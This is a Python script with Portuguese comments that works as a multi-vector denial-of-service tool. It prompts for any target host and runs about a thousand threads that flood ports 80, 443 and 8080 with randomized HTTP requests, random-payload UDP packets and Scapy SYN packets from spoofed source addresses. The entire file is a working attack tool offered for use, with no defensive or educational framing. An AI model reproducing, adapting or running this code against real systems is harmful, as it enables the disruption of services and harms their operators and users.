import socket
import threading
import random
from scapy.all import *

# Entrada interativa: IP ou domínio do alvo
HOST_ALVO = input("Digite o IP ou domínio do alvo: ").strip() or "127.0.0.1"

# Portas a serem atacadas
PORTAS_ALVO = [80, 443, 8080]  # HTTP, HTTPS, API
THREADS = 1000  # Número de threads
PACOTES_POR_THREAD = 5000  # Pacotes enviados por cada thread

# Cabeçalhos HTTP aleatórios
HEADERS = [
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
    "Accept: */*",
    "Connection: keep-alive"
]

# Lista de IPs falsos para spoofing simulado
IPS_FALSOS = [f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}" for _ in range(1000)]

def ataque_http():
    """Envia requisições HTTP massivas ao servidor."""
    for _ in range(PACOTES_POR_THREAD):
        try:
            porta = random.choice(PORTAS_ALVO)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST_ALVO, porta))

            request = f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
            request += f"Host: {HOST_ALVO}\r\n"
            request += random.choice(HEADERS) + "\r\n"
            request += "Connection: keep-alive\r\n\r\n"

            sock.send(request.encode("utf-8"))
            sock.close()
            print(f"[{threading.current_thread().name}] HTTP enviado para {porta}")

        except socket.error:
            print(f"[{threading.current_thread().name}] Erro na conexão!")

def ataque_udp():
    """Envia pacotes UDP massivos."""
    for _ in range(PACOTES_POR_THREAD):
        try:
            porta = random.choice(PORTAS_ALVO)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            pacote = random._urandom(1024)  # 1KB de dados aleatórios

            sock.sendto(pacote, (HOST_ALVO, porta))
            print(f"[{threading.current_thread().name}] UDP enviado para {porta}")

        except socket.error:
            print(f"[{threading.current_thread().name}] Erro na conexão!")

def ataque_scapy():
    """Envia pacotes TCP SYN massivos usando Scapy (simulando um ataque SYN Flood)."""
    for _ in range(PACOTES_POR_THREAD):
        try:
            ip_falso = random.choice(IPS_FALSOS)
            porta = random.choice(PORTAS_ALVO)

            pacote = IP(src=ip_falso, dst=HOST_ALVO) / TCP(dport=porta, flags="S")
            send(pacote, verbose=False)

            print(f"[{threading.current_thread().name}] TCP SYN enviado de {ip_falso} para {porta}")

        except Exception as e:
            print(f"[{threading.current_thread().name}] Erro no Scapy: {e}")

def iniciar_ataque():
    """Inicia múltiplas threads para o ataque distribuído massivo."""
    threads = []

    for i in range(THREADS // 3):  # Divide entre os 3 tipos de ataque
        threads.append(threading.Thread(target=ataque_http, name=f"HTTP-{i+1}"))
        threads.append(threading.Thread(target=ataque_udp, name=f"UDP-{i+1}"))
        threads.append(threading.Thread(target=ataque_scapy, name=f"SYN-{i+1}"))

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print(f"Iniciando ataque ao {HOST_ALVO} nas portas {PORTAS_ALVO} com {THREADS} threads...")
    iniciar_ataque()
